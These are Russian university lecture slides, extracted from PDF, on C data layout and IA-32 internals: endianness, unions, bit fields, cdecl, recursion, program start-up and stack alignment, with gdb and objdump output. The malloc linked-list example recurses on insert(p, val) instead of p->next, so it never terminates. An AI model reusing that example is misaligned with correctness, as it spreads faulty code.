                        Порядок байт

• Основная идея
   – short/long/double хранятся в памяти как последовательности из
     2/4/8 байт
   – Где именно расположен старший (младший) байт?
   – Может являться проблемой при пересылке двоичных данных
     между машинами разной архитектуры
• Big-endian / от старшего к младшему aka network byte order
   – Старший байт имеет наименьший адрес
   – Sparc (до V8)
• Little-endian / от младшего к старшему
   – Младший байт имеет наименьший адрес
   – Intel x86 (IA-32)
• Переключаемый порядок байт
   – ARM, PowerPC, Alpha, SPARC V9, MIPS, PA-RISC и IA-64

                                                                      39
                                                                                                        © 2024 МГУ/ВМК/СП




                               Маршалинг данных

•   Проблему взаимодействия различных устройств в сети создает не столько
    порядок байт, сколько различные требования по выравниванию данных,
    различные компиляторы и языки программирования
•   Маршалинг - преобразование данных, хранящихся в памяти компьютера, в
    формат, пригодный для хранения или передачи по сети.
     –    Загрузка данных в память – демаршалинг
     –    Почти идентичный по смыслу термин – сериализация (десериализация), перевод
          объекта/структуры в поток байтов таким образом, чтобы указанный поток мог быть
          преобразован обратно в копию исходного объекта/структуры
•   Характерные средства маршалинга данных
     –    Текстовые данные – XML https://www.w3.org/TR/xml11/
     –    Двоичные данные – Proto Buffer https://developers.google.com/protocol-buffers/

                                               ARM                       ARM
                                               MIPS                      MIPS
                                               PowerPC                   PowerPC
                  x86-64                       RISC-V                    x86-64
                                                                                                    ARM
                   ARM                         …                         RISC-V
                                                                         …

         Сервер
                               Магистральный                                               Мобильное
                           …   маршрутизатор     …       Маршрутизатор    Локальная сеть
                                                                                           устройство

                                                                                                               40
                                                                © 2024 МГУ/ВМК/СП




                             Пример
  union {
    unsigned char c[8];
    unsigned short s[4];
    unsigned int i[2];
    unsigned long l[1];
  } dw;

32 бита c[0]   c[1]   c[2]   c[3]   c[4]   c[5]   c[6]   c[7]
           s[0]          s[1]          s[2]          s[3]
                  i[0]                        i[1]
                  l[0]


64 бита c[0]   c[1]   c[2]   c[3]   c[4]   c[5]   c[6]   c[7]
           s[0]          s[1]          s[2]          s[3]
                  i[0]                        i[1]
                                                                       41
                                l[0]
                                                  © 2024 МГУ/ВМК/СП



      Пример (продолжение)
int j;
for (j = 0; j < 8; j++)
    dw.c[j] = 0xf0 + j;

printf("Characters 0-7 ==
[0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x]\n",
    dw.c[0], dw.c[1], dw.c[2], dw.c[3],
    dw.c[4], dw.c[5], dw.c[6], dw.c[7]);

printf("Shorts 0-3 == [0x%x,0x%x,0x%x,0x%x]\n",
    dw.s[0], dw.s[1], dw.s[2], dw.s[3]);

printf("Ints 0-1 == [0x%x,0x%x]\n",
    dw.i[0], dw.i[1]);

printf("Long 0 == [0x%lx]\n",
    dw.l[0]);
                                                         42
                                                                                                 © 2024 МГУ/ВМК/СП

      Порядок байт IA-32 и многих других
                 архитектур
 Порядок байт от младшего к старшему

               f0          f1          f2          f3   f4          f5          f6          f7
              c[0]     c[1]        c[2]        c[3]     c[4]    c[5]        c[6]        c[7]
                    s[0]                    s[1]             s[2]                    s[3]
                                i[0]                                     i[1]
                                l[0]
              LSB                                  MSB LSB                                  MSB
                       Область печати

Вывод на консоль:
Characters 0-7 == [0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7]
Shorts     0-3 == [0xf1f0,0xf3f2,0xf5f4,0xf7f6]
Ints       0-1 == [0xf3f2f1f0,0xf7f6f5f4]
Long       0   == [0xf3f2f1f0]

                                                                                                        43
                                                                                                  © 2024 МГУ/ВМК/СП

         Порядок байт SPARC, PPC, m68k и
           некоторых других архитектур
 Порядок байт от старшего к младшему

               f0          f1          f2          f3    f4          f5          f6          f7
              c[0]     c[1]        c[2]        c[3]     c[4]     c[5]        c[6]        c[7]
                    s[0]                    s[1]              s[2]                    s[3]
                                i[0]                                      i[1]
                                l[0]
             MSB                                    LSB MSB                                   LSB
                       Область печати

Вывод на консоль:
Characters 0-7 == [0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7]
Shorts     0-3 == [0xf0f1,0xf2f3,0xf4f5,0xf6f7]
Ints       0-1 == [0xf0f1f2f3,0xf4f5f6f7]
Long       0   == [0xf0f1f2f3]
                                                                                                         44
                                                                                                        © 2024 МГУ/ВМК/СП



              Порядок байт в x86-64
  Порядок байт от младшего к старшему

               f0          f1          f2          f3          f4          f5          f6          f7
              c[0]     c[1]        c[2]        c[3]        c[4]        c[5]        c[6]        c[7]
                    s[0]                    s[1]                    s[2]                    s[3]
                                i[0]                                            i[1]
                                                        l[0]
              LSB                                                                                  MSB
                                                    Область печати
 Вывод на консоль:
Characters 0-7 == [0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7]
Shorts     0-3 == [0xf1f0,0xf3f2,0xf5f4,0xf7f6]
Ints       0-1 == [0xf3f2f1f0,0xf7f6f5f4]
Long       0   == [0xf7f6f5f4f3f2f1f0]
                                                                                                               45
                                               © 2024 МГУ/ВМК/СП




                  Битовые поля

• Размещение битовых полей зависит от реализации
• Битовые поля могут размещаться как справа налево,
  так и наоборот, в зависимости от реализации
• Битовые поля могут пересекать границы машинных
  слов
• Выравнивание битовых полей зависит от реализации
• К битовым полям неприменима операция & и
  оператор sizeof
• Код непереносим между различными системами

                                                      46
                                                            © 2024 МГУ/ВМК/СП


typedef union {          checkEflagsState:
   unsigned int raw;        push ebp
   struct {                 mov ebp, esp
      int CF   : 1;         mov eax, dword [ebp+8]
      int gap1 : 1;         mov edx, dword [eax]
      int PF   : 1;         xor eax, eax
      int gap2 : 1;         test edx, -4161496
      int AF   : 1;           ; 11111111_11000000_10000000_00101000b
      int gap3 : 1;         jne .L3
      int ZF   : 1;         mov eax, edx
...                         shr eax
      int gap5 : 10;        and eax, 1
   } fields;             .L3:
} t_eflags;                 pop     ebp
                            ret
int checkEflagsState(t_eflags *sw) {
   t_eflags andMask = {0};
   andMask.fields.gap2 = 1;
   andMask.fields.gap3 = 1;
   andMask.fields.gap4 = 1;
   andMask.fields.gap5 = -1;
   return !(sw->raw & andMask.raw) && (sw->raw & 2);
                                                                   47
}
                                                                                 © 2024 МГУ/ВМК/СП



                             Типы данных языка Си
                                     Итоги
•   Размещение переменных
        –     Классы памяти: автоматическая, статическая, динамическая
        –     Регистр вместо памяти (при определенных условиях)
•   Массивы в языке Си
    –       Непрерывная последовательность байт в памяти
    –       Выравнивание всего массива удовлетворяет требования к выравниванию
            для каждого его элемента
    –       Имя массива – указатель на его первый элемент
    –       Нет никаких проверок выхода за границы
•   Структуры
    –       Память под поля выделяется в порядке объявления этих полей
    –       Помещаются пропуски между полями и в конце всей структуры с целью
            выравнивания данных
    –       Для единообразной работы программ на разных
            процессорных архитектурах (разных ABI)
            необходимо задавать спецификацию формата
            данных, а не тип данных некоторого
            языка программирования
•   Объединения
    –       Объявленные поля перекрываются в памяти
    –       Способ жестокого обмана системы типов языка Си
                                                                                        48
                                                                  © 2024 МГУ/ВМК/СП




                                         Далее…

•   Функции
     –   Соглашение CDECL, рекурсия
     –   Что происходит в Си-программе до и после функции main
     –   Выравнивание стека, использование библиотечных функций
     –   Различные соглашения о вызове функций
          • cdecl/stdcall/fastcall, отказ от указателя фрейма
          • Гибридное соглашение
     –   Переменное число параметров
•   Архитектура x86-64
     –   Особенности
     –   Модель памяти
     –   Соглашение вызова функций
•   Безопасность программного обеспечения
     –   Переполнение буфера и эксплуатация ошибок
     –   Механизмы защиты
          • Компиляторные
          • Со стороны ОС
          • Со стороны аппаратуры
•   Организация динамической памяти
•   Числа с плавающей точкой
                                                                         49
             © 2024 МГУ/ВМК/СП




Лекция 0xA


 13 марта
                                                                   © 2024 МГУ/ВМК/СП




   Поддержка функций на уровне аппаратуры
• Аппаратный стек
   – Регистр ESP указывает на верхушку стека
   – Стек растет вниз                            Фрейм
   – Команды PUSH и POP, сложение и         вызывающей
     вычитание констант из ESP                  функции
                                                               Аргументы
• Вызов/возврат
   – Команды CALL и RET                                      Адрес возврата
                                                 Указатель
• Состояния выполняющихся функций                            «Старый» ebp
                                               фрейма ebp
   – На стеке размещаются фреймы                              Сохраненные
   – Каждый фрейм хранит текущее                                регистры
     состояние вызова функции                                       +
   – На верхнюю границу указывает EBP                        Автоматические
   – Содержимое                                                локальные
       • Фактические аргументы/формальные                     переменные
         параметры
       • Адрес возврата                                      «Пространство
       • Автоматические локальные переменные                  параметров»
                                                Указатель
       • Вспомогательные переменные
                                                стека esp                  2
                                                                   © 2024 МГУ/ВМК/СП



 Поддержка функций на уровне соглашений:
            соглашение CDECL
• Размещение параметров
   – На стеке, с обязательным выравниванием по 4-х байтной границе
• Порядок параметров
   – «Обратный», от «верхушки» стека ко «дну»: сразу над адресом
     возврата размещен первый параметр, затем второй, и т.д.
• Очистка стека от аргументов после вызова
   – Очищает вызывающая функция
   – Сохранность значений в пространстве аргументов после возврата в
     вызывающую функцию не гарантируется
   – Поскольку cdecl в большинстве случаев не предполагает изменение
     границ фрейма во время работы функции, очистка после возврата в
     вызывающую функцию фактически не выполняется, а переносится в
     эпилог
• Возвращаемое функцией значение
   – EAX
   – EDX:EAX
   – Через память
                                                                           3
                                                       © 2024 МГУ/ВМК/СП



 Размещение параметров и возвращаемого
               значения
• sizeof == 4
   – Целиком занимает машинное слово, помещаемое на стек
   – EAX
• sizeof < 4
   – Занимает младшие байты слова на стеке
   – AX, AL
• sizeof == 8 (long long)
   – Два машинных слова в естественном порядке
   – EDX:EAX
• Массивы ≡ указатели
• Структуры и объединения
   – В gcc используется гибридное соглашение вызова,
     совмещающее cdecl и stdcall
     (соглашение вызова 32-х разрядного WinAPI)
                                                               4
                                                          © 2024 МГУ/ВМК/СП



  Сохранение регистров в IA32/Linux+Windows
• eax, edx, ecx
  – Вызывающая функция сохраняет
    эти регистры перед call, если                   eax
    планирует использовать позже     Сохраняются
• eax                                вызывающей     edx
  – Используется для возврата           функцией    ecx
    значения, если возвращается
    целый тип                                       ebx
                                     Сохраняются
• ebx, esi, edi                        вызванной    esi
  – Вызванная функция сохраняет         функцией
    значения этих регистров, если                   edi
    планирует ими воспользоваться                   esp
• esp, ebp                            Служебные
                                       (стековые)   ebp
  – Сохраняются вызванной функцией
                                         регистры
  – Восстанавливаются перед
    выходом из функции

                                                                  5
                                                           © 2024 МГУ/ВМК/СП



                   Рекурсивная функция
                                    pcount_r:
/* Рекурсивный popcount */               push ebp
int pcount_r(unsigned x) {               mov  ebp, esp
  if (x == 0)                            push ebx
    return 0;                            sub  esp, 4
  else return                            mov  ebx, dword [ebp + 8]
    (x & 1) + pcount_r(x >> 1);          mov  eax, 0
}                                        test ebx, ebx
                                         je .L3
                                         mov  eax, ebx
                                         shr  eax, 1
 • Регистры                              mov  dword [esp], eax
   – eax, edx используются без           call pcount_r
     предварительного сохранения         mov  edx, ebx
                                         and  edx, 1
   – ebx используется, но                lea  eax, [edx + eax]
     предварительно сохраняется в   .L3:
     начале функции и                    add  esp, 4
     восстанавливается в конце           pop  ebx
                                         pop  ebp
                                                                6
                                         ret
                                                                  © 2024 МГУ/ВМК/СП



                 Рекурсивный вызов (1/5)
/* Рекурсивный popcount */             pcount_r:
int pcount_r(unsigned x) {                 push    ebp   Пролог функции
  if (x == 0)                              mov     ebp, esp
    return 0;                              push    ebx
  else return                              sub     esp, 4
    (x & 1) + pcount_r(x >> 1);
}                                         mov      ebx, dword [ebp + 8]
                                          ...
 • Действия в прологе                                    •
   – Сохраняем и «переставляем» ebp                      •
   – Сохраняем значение ebx на стеке                     •
   – Расширяем фрейм: выделяем место                     x
     для размещения аргумента                           Адрес
     рекурсивного вызова                              возврата
                                                      «Прежний»
 • Размещаем значение x в ebx                            ebp            ebp
                                                      «Прежний»
                                                         ebx
                   ebx     x                                            esp
                                                                          7
                                                       © 2024 МГУ/ВМК/СП



                  Рекурсивный вызов (2/5)
/* Рекурсивный popcount */
int pcount_r(unsigned x) {            ...
  if (x == 0)                          mov  eax, 0
    return 0;                          test ebx, ebx
  else return                          je .L3
    (x & 1) + pcount_r(x >> 1);       ...
}                                 .L3:
                                      ...
                                       ret
 • Действия
   – Если x == 0, выходим из
     функции
      • Регистр eax содержит 0




                    ebx      x
                                                               8
                                                              © 2024 МГУ/ВМК/СП



                 Рекурсивный вызов (3/5)
/* Рекурсивный popcount */
int pcount_r(unsigned x) {                ...
  if (x == 0)                             mov    eax, ebx
    return 0;                             shr    eax, 1
  else return                             mov    dword [esp], eax
    (x & 1) + pcount_r(x >> 1);           call   pcount_r
}                                         ...

 • Действия                                          •
   – Сохраняем x >> 1 на стеке                       •
   – Выполняем рекурсивный вызов                     •
 • Результат                                        Адрес
                                                  возврата
   – eax содержит возвращенное значение           «Прежний»
                                                     ebp            ebp
   – ebx содержит неизменное значение x           «Прежний»
                                                     ebx
                                                   x >> 1           esp
                   ebx     x                                          9
                                                                  © 2024 МГУ/ВМК/СП



                 Рекурсивный вызов (4/5)
/* Рекурсивный popcount */
int pcount_r(unsigned x) {                 ...
  if (x == 0)                              mov       edx, ebx
    return 0;                              and       edx, 1
  else return                              lea       eax, [edx + eax]
    (x & 1) + pcount_r(x >> 1);            ...
}


 • Состояние регистров
   – eax содержит значение полученное от
     рекурсивного вызова
   – ebx содержит x
 • Действия                                              ebx      x
   – Вычисляем (x & 1) + возвращенное значение
 • Результат
   – Регистр eax получает результат работы функции                       10
                                                                    © 2024 МГУ/ВМК/СП



                 Рекурсивный вызов (5/5)
/* Рекурсивный popcount */                      ...
int pcount_r(unsigned x) {                L3:
  if (x == 0)                                   add esp,     4
    return 0;                                   pop ebx
  else return                                   pop ebp
    (x & 1) + pcount_r(x >> 1);                 ret
}                                                           Эпилог функции


                                                                          ebp
• Действия в
                               •                            •
  эпилоге
                               •                            •
  – Восстанавливаем            •                            •
    значения ebx и ebp                                                    esp
                              Адрес
  – Восстанавливаем         возврата
    esp                   «Прежний» ebp         ebp
                          «Прежний» ebx
                                                           ebx
                                                       «Прежний»
                                                esp       ebx
                                                                           11
                                                                         © 2024 МГУ/ВМК/СП



                      Рекурсия – выводы
• Не используются дополнительные приемы
 – Создание фреймов гарантирует, что каждый вызов располагает
   персональным блоком памяти
    • Хранятся регистры и локальные переменные
    • Хранится адрес возврата
 – Общее соглашение о сохранении регистров препятствует порче
   регистров различными вызовами
 – Стековая организация поддерживается порядком вызовов и возвратов
   из функций
    • Если P вызывает Q, тогда Q завершается до того, как завершится P
    • Последним пришел, первым ушел
• Аналогично при неявной рекурсии
 – P вызывает Q; Q вызывает P


                                                                                12
                                                                     © 2024 МГУ/ВМК/СП



            Обратная задача – восстанавливаем
               объявление функции (CDECL)
тело Си-функции             Соответствующий ассемблерный код
{                           ;   типовой пролог
      *p = d;
      return x-c;               movsx edx, byte [ebp+12]
}                               mov   eax, [ebp+16]
                                mov   [eax], edx
                                movsx eax, word [ebp+8]
p, d, x, c                      mov   edx, [ebp+20]
формальные
                                sub   edx, eax
параметры
                                mov   eax, edx
функции
                            ;   типовой эпилог



    Требуется восстановить объявление функции: порядок параметров,
    их типы, тип возвращаемого значения
                                                                            13
                                                                         © 2024 МГУ/ВМК/СП




         ABI – двоичный интерфейс приложения

    • Двоичный интерфейс приложения (application binary interface)
      задает правила взаимодействия между модулями программы
      на уровне исполняемого кода
         – Библиотеки и функции операционной системы (системные вызовы)
           также рассматриваются как модули, входящие в состав программы
    • ABI определяет
         – Использование ISA и регистров             Модуль Х   ABI    Модуль Y
           процессора, организацию стека и т.п.




                                                                          ABI
                                                                  ABI
         – Соглашение вызова функций
         – Размещение данных в памяти,
           требования по выравниванию                   Операционная система
         – Выполнение системных вызовов
         – Формат объектных файлов, состав библиотек
           (в случае, если ABI описывает всю среду выполнения программ)
    • При соблюдении ABI можно разрабатывать модули программы
      на разных языках программирования
                                                                                14
Пример ABI: http://www.sco.com/developers/devspecs/abi386-4.pdf
                                                                © 2024 МГУ/ВМК/СП
Вставляем элемент в непустой список,
Указатели на элемент и список не нулевые. Логика приложения
typedef struct chain chain;
struct chain {                                     Уровни интерфейсов
   int    payload;
   chain *next;
};                                                    Контракты
                Понятия языка программирования
chain* insert(chain* list, chain* elem) {
                                                       функций
 if (0 == list->next) {
    ...
                                                          API
insert:
                       Компоненты компьютера
   push    ebx
   sub     esp, 8
   mov     ebx, dword [esp+16]                            ABI
   mov     eax, dword [ebx+4]
   test    eax, eax
   je      .L22
   ...                                                    ISA
esp   ← esp-4
[esp] ← ebx                   Двоичные данные                          15
...
                                                                                               © 2024 МГУ/ВМК/СП




                                                   Функция main
#include <stdio.h>

void nullify(int argc, char* argv[]) {
}

int main(int argc, char* argv[]) {
   nullify(argc, argv);    • Есть ли отличия у функции main от
   return 0;                  остальных функций?
}                          • Откуда берутся параметры argc и argv ?
                                                       •     Что происходит со стеком в функции main ?

                                                       и наконец …
                                                       • Как можно воспользоваться стандартной
                                                          библиотекой языка Си в ассемблерной
По мотивам:                                               программе?
Linux x86 Program Start Up
or - How the heck do we get to main()?
by Patrick Horgan                                                                                     16
http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html
                                                                             © 2024 МГУ/ВМК/СП

student@pc:~/asm$ gcc –m32 -g –no-pie –fno-pic -o main main.c
student@pc:~/asm$ gdb main

(gdb) br main
Breakpoint 1 at 0x80483ff: file main.c, line 7.
(gdb) run
Starting program: /home/student/asm/main

Breakpoint 1, main (argc=1, argv=0xffffd144) at main.c:7
7         nullify(argc, argv);
(gdb) bt
#0 main (argc=1, argv=0xffffd144) at main.c:7
(gdb) set backtrace past-main on
(gdb) bt
#0 main (argc=1, argv=0xffffd144) at main.c:7
#1 0xf7dfbe81 in __libc_start_main () from /lib32/libc.so.6
#2 0x08048312 in _start ()
(gdb)
                         student@pc:~/asm$ gcc –v
                         …
                         Target: x86_64-linux-gnu
                         …
                         gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)
                                                                                    17
                                                                            © 2024 МГУ/ВМК/СП


                                                          Загрузчик
                                                          операционной
student@pc:~/asm$ nm main                                 системы
...
08048480 T __libc_csu_fini
08048420 T __libc_csu_init                                        Программа
         U __libc_start_main@@GLIBC_2.0                           начинает
080483fc T main                                                   работать здесь …
080483f6 T nullify
...
080482e0 T _start                                                        А здесь
...                                                                      начинает
                                                                         работать код
Компилятор                                                               Си-программы
(компоновщик)
добавляет к программе
код поддержки
времени выполнения




         Запуск сбора профиля (если эта опция включена)
         http://www.opennet.ru/docs/RUS/gprof/


                                                                                   18
crt1.o crti.o crtn.o crtbegin.o crtend.o
                                                                  © 2024 МГУ/ВМК/СП

                        Начальное состояние стека         envp
                                                          argv
080482e0 <_start>:
 80482e0:      31 ed                 xor    ebp,ebp        argc         esp
 80482e2:      5e                    pop    esi
 80482e3:      89 e1                 mov    ecx,esp
 80482e5:      83 e4 f0              and    esp,0xfffffff0
 80482e8:      50                    push   eax Выравнивание стека
 80482e9:      54                    push   esp (границ фрейма) по 16 байт
 80482ea:      52                    push   edx
 80482eb:      e8 23 00 00 00        call   8048313 <_start+0x33>
 80482f0:      81 c3 10 1d 00 00     add    ebx,0x1d10
 80482f6:      8d 83 80 e4 ff ff     lea    eax,[ebx-0x1b80]
 80482fc:      50                    push   eax
 80482fd:      8d 83 20 e4 ff ff     lea    eax,[ebx-0x1be0]
 8048303:      50                    push   eax
 8048304:      51                    push   ecx
 8048305:      56                    push   esi         Адрес функции main
 8048306:      c7 c0 fc 83 04 08     mov    eax,0x80483fc
 804830c:      50                    push   eax
 804830d:      e8 ae ff ff ff        call   80482c0 <__libc_start_main@plt>
 8048312:      f4                    hlt
 8048313:      8b 1c 24              mov    ebx,DWORD PTR [esp]
 8048316:      c3                    ret
  ...                                                                    19
               student@pc:~/asm$ objdump -M intel -d main
                                                                                        © 2024 МГУ/ВМК/СП



           int __libc_start_main( int (*main) (int, char **, char **),
080482e0 <_start>:                                           int argc,
 80482e0: xor    ebp,ebp                               char ** ubp_av,
 80482e2: pop    esi
                                                  void (*init) (void),
 80482e3: mov    ecx,esp
 80482e5: and    esp,0xfffffff0                   void (*fini) (void),
 80482e8: push   eax                         void (*rtld_fini) (void),
 80482e9: push   esp
                                                  void (* stack_end));
 80482ea: push      edx
 80482eb: call      8048313 <_start+0x33>
 80482f0: add       ebx,0x1d10
 80482f6: lea       eax,[ebx-0x1b80]
 80482fc: push      eax
 80482fd: lea       eax,[ebx-0x1be0]
 8048303: push      eax
 8048304: push      ecx
 8048305: push      esi
 8048306: mov       eax,0x80483fc
 804830c: push      eax
 804830d: call      80482c0 <__libc_start_main@plt>
 8048312: hlt
 8048313: mov       ebx,DWORD PTR [esp]
 8048316: ret
...                                                                                            20
    https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.html
                                                                            © 2024 МГУ/ВМК/СП




                         Функция main
                                     ассемблерный листинг адаптирован под синтаксис nasm
 080483fc <main>:
  80483fc:        55                          push      ebp
  80483fd:        89 e5                       mov       ebp,esp
  80483ff:        ff 75 0c                    push      dword [ebp+0xc]
  8048402:        ff 75 08                    push      dword [ebp+0x8]
  8048405:        e8 ec ff ff ff              call      nullify
  804840a:        83 c4 08                    add       esp,0x8
  804840d:        b8 00 00 00 00              mov       eax,0x0
#include
  8048412:<stdio.h>
                  c9                          leave
  8048413:        c3                          ret
  ... nullify(int argc, char* argv[]) {
void
}

int main(int argc, char* argv[]) {        В зависимости от версии
   nullify(argc, argv);
                                          компилятора gcc
                                          выравнивание стека может
   return 0;                              выполняться в функции
}                                         _start и/или main
                                                                                   21
                                                                     © 2024 МГУ/ВМК/СП
#include <stdio.h>
                                                  Загрузчик
                                                  операционной
void __attribute__ ((constructor))
                                                  системы
my_constructor() {
   printf("%s\n", __FUNCTION__);                            Программа
                                                            начинает
}
                                                            работать здесь …

void __attribute__ ((destructor))                                Здесь
my_destructor() {                                                начинает
   printf("%s\n", __FUNCTION__);                                 работать код
                                                                 Си-программы
}

int main() {
   printf("%s\n",__FUNCTION__);
}                                                         А эти функции –
                                                          после main

                                                       Функции, которые
student@pc:~/asm$ ./main2                              будут работать до
my_constructor                                         вызова main …
main                                                                        22
my_destructor     Идея метода/функции-конструктора не принадлежит Си++
                                                                  © 2024 МГУ/ВМК/СП

                         student@pc:~/asm$ objdump -M intel -d main2
08048426 <my_constructor>:
 8048426:       55                      push    ebp
 8048427:       89 e5                   mov     ebp,esp
 8048429:       83 ec 08                sub     esp,0x8
 804842c:       83 ec 0c                sub     esp,0xc
 804842f:       68 10 85 04 08          push    0x8048510
 8048434:       e8 a7 fe ff ff          call    80482e0 <puts@plt>
 8048439:       83 c4 10                add     esp,0x10
 804843c:       90                      nop
 804843d:       c9                      leave
 804843e:       c3                      ret

0804843f <my_destructor>:
 804843f:       55                      push    ebp
 8048440:       89 e5                   mov     ebp,esp
 8048442:       83 ec 08                sub     esp,0x8
 8048445:       83 ec 0c                sub     esp,0xc
 8048448:       68 20 85 04 08          push    0x8048520
 804844d:       e8 8e fe ff ff          call    80482e0 <puts@plt>
 8048452:       83 c4 10                add     esp,0x10
 8048455:       90                      nop
 8048456:       c9                      leave
 8048457:       c3                      ret                              23
                                                                           © 2024 МГУ/ВМК/СП
gcc version 7.4.0

                                             student@pc:~/asm$ objdump -h main2
main2:              file format elf32-i386
Sections:
Idx Name                  Size      VMA          LMA        File off    Algn
...
 13 .text                 000001e2 08048310 08048310 00000310          2**4
                          CONTENTS, ALLOC, LOAD, READONLY, CODE
...
 18 .init_array           00000008 08049f04 08049f04        00000f04    2**2
                          CONTENTS, ALLOC, LOAD, DATA
  19 .fini_array          00000008 08049f0c 08049f0c        00000f0c    2**2
                          CONTENTS, ALLOC, LOAD, DATA
...

     student@pc:~/asm$ objdump -s -j .init_array -j .fini_array main2
main2:              file format elf32-i386
Contents of section .init_array:
 8049f04 20840408 26840408                                 ...&...
Contents of section .fini_array:
 8049f0c f0830408 3f840408                                ....?...


                                                                                  24
             © 2024 МГУ/ВМК/СП




Лекция 0xB


 16 марта
                                                            © 2024 МГУ/ВМК/СП




                 Оболочка вокруг main

• Выравнивание стека
    – Каждый вызов функции происходит на выровненном стеке
    – Необходимо формировать каждый фрейм таким образом, чтобы
      однажды выполненное выравнивание сохранялось
• Поддержка повышенного уровня привилегий для данного
  запуска программы
• Поддержка многопоточного выполнения
• Запуск сбора профиля и запись в файл результатов
  профилирования после завершения работы деструкторов
    – Если программа была собрана с данной опцией
•   Запуск «конструкторов» - функций инициализации
•   Запуск функции main с аргументами argc и argv
•   Запуск «деструкторов» - функций освобождения ресурсов
•   Передача результата функции main в функцию exit

                                                                    2
                                                                       © 2024 МГУ/ВМК/СП




       Функция main с выравниванием стека
                                ассемблерный листинг адаптирован под синтаксис nasm
08048360 <main>:
 8048360:      8d 4c 24 04          lea       ecx, [esp+0x4]
 8048364:      83 e4 f0             and       esp, 0xfffffff0
 8048367:      ff 71 fc             push      dword [ecx-0x4]
 804836a:      55                   push      ebp
 804836b:      89 e5                mov       ebp, esp
 804836d:      51                   push      ecx
 804836e:      83 ec 10             sub       esp, 0x10
 8048371:      68 10 85 04 08       push      0x8048510
 8048376:      e8 75 ff ff ff       call      80482f0 <puts@plt>
 804837b:      8b 4d fc             mov       ecx, dword [ebp-0x4]
 804837e:      83 c4 10             add       esp, 0x10
 8048381:      c9                   leave
 8048382:      8d 61 fc             lea       esp, [ecx-0x4]
 8048385:      c3                   ret



                                                                               3
                                                           © 2024 МГУ/ВМК/СП




                  Пример вызова malloc


#include <stdlib.h>      p_chain insert(p_chain p, int val) {
                            if ((0 == p) || (p->val > val)) {
struct chain;                  p_chain np =
                                  (p_chain)malloc(sizeof(t_chain));
typedef struct chain {         np->val = val;
   int val;                    np->next = p;
   struct chain *next;         return np;
} t_chain, *p_chain;        } else {
                               p->next = insert(p, val);
                               return p;
                            }
                         }

                                                                   4
                                                      © 2024 МГУ/ВМК/СП




                  Пример вызова malloc
p_chain insert(p_chain p, int val) {
   if ((0 == p) || (p->val > val)) {
      p_chain np =
         (p_chain)malloc(sizeof(t_chain));
      np->val = val;
      np->next = p;
      return np;
                                %include 'io.inc'
   } else {
      p->next = insert(p, val); section .text
      return p;
   }                            CEXTERN malloc
}
                                insert:
                                   push    ebp
                                   mov     ebp, esp
                                   sub     esp, 24
                                   ; ...                      5
                                                            © 2024 МГУ/ВМК/СП




                  Пример вызова malloc
p_chain insert(p_chain p, int val) {
   if ((0 == p) || (p->val > val)) {
      p_chain np =
         (p_chain)malloc(sizeof(t_chain));
      np->val = val;
      np->next = p;
      return np;
   } else {                     insert:
      p->next = insert(p, val);    ; ...
      return p;                    mov     dword [ebp-4], esi
                                   mov     esi, dword [ebp+8]
   }
                                   mov     dword [ebp-8], ebx
}                                  mov     ebx, dword [ebp+12]
                                   ; ...


                                                                    6
                                                            © 2024 МГУ/ВМК/СП




                  Пример вызова malloc
p_chain insert(p_chain p, int val) {
   if ((0 == p) || (p->val > val)) {
      p_chain np =
         (p_chain)malloc(sizeof(t_chain));
      np->val = val;               test    esi, esi
      np->next = p;                je      .L2
      return np;                   cmp     dword [esi], ebx
                                   jle     .L3
   } else {                     .L2:
      p->next = insert(p, val);    mov     dword [esp], 8
      return p;                    call    malloc
   }                               mov     dword [eax], ebx
}                                  mov     dword [eax+4], esi
                                   mov     ebx, dword [ebp-8]
                                   mov     esi, dword [ebp-4]
                                   mov     esp, ebp
                                   pop     ebp
                                   ret                              7
                                .L3:
                                                            © 2024 МГУ/ВМК/СП




                  Пример вызова malloc
p_chain insert(p_chain p, int val) {
   if ((0 == p) || (p->val > val)) {
      p_chain np =
         (p_chain)malloc(sizeof(t_chain));
      np->val = val;
      np->next = p;                ; …
                                .L3:
      return np;
                                   mov     dword [esp+4], ebx
   } else {                        mov     dword [esp], esi
      p->next = insert(p, val);    call    insert
      return p;                    mov     dword [esi+4], eax
   }                               mov     eax, esi
                                   mov     ebx, dword [ebp-8]
}
                                   mov     esi, dword [ebp-4]
                                   mov     esp, ebp
                                   pop     ebp
                                   ret
                                                                    8
© 2024 МГУ/ВМК/СП




        9
                                                     © 2024 МГУ/ВМК/СП




        Стандартная библиотека языка Си

• 24 заголовочных файла
• stdlib.h
   – Преобразование типов: atoi, strtod, …
   – Генерация псевдослучайных последовательностей
   – Выделение и освобождение памяти
   – Сортировка и поиск
   – Математика
• stdio.h
   – Функции для файловых операций
   – Функции для операций ввода-вывода
• string.h
• …
                                                            10
                                                            © 2024 МГУ/ВМК/СП




                 Выравнивание стека

• На стек помещаем только машинные слова (4 байта)
• Выравнивание стека по границе в 16 байт
  IA-32/Linux/gcc
   – выполняется в функции main
   – остальные функции поддерживают выравнивание, формируя
     фрейм определенного размера
   – для листовых функций необязательно
• Не только производительность: команда MOVDQA
   – SSE2, Pentium4, 2001 г.
   – MOVDQA xmm, xmm/m128
     MOVDQA xmm/m128, xmm
   – Быстрое копирование блока данных размером 16 байт
     ОП1  ОП2
   – Аварийное завершение работы (#GP), если начальный адрес блока
     не выровнен по границе в 16 байт
                                                                   11
                                                                    © 2024 МГУ/ВМК/СП




              Отказ от указателя фрейма

• Пролог и эпилог функций вносят
  накладные расходы
   – Особенно заметно на небольших
     функциях
• Содержимое фрейма                                             Аргументы
                                                         +8
  распределяется во время                                     Адрес возврата
                                                         +4
  компиляции                                Указатель
                                                              «Старый» ebp
   – как правило, все размещаемые         фрейма ebp
     внутри фрейма данные могут быть                     -4    Сохраненные
     адресованы через константные                        -8      регистры
     смещения                                                        +
• Используем для адресации только                             Автоматические
  ESP                                                           локальные
   – Порядок использования EBP – часть                  +12    переменные
     ABI (Application Binary Interface)
                                                         +8   «Пространство
   – До 2011 года gcc не включал опцию                   +4
     -fomit-frame-pointer                  Указатель           параметров»
     в общие списки оптимизаций            стека esp                       12
                                                                             © 2024 МГУ/ВМК/СП




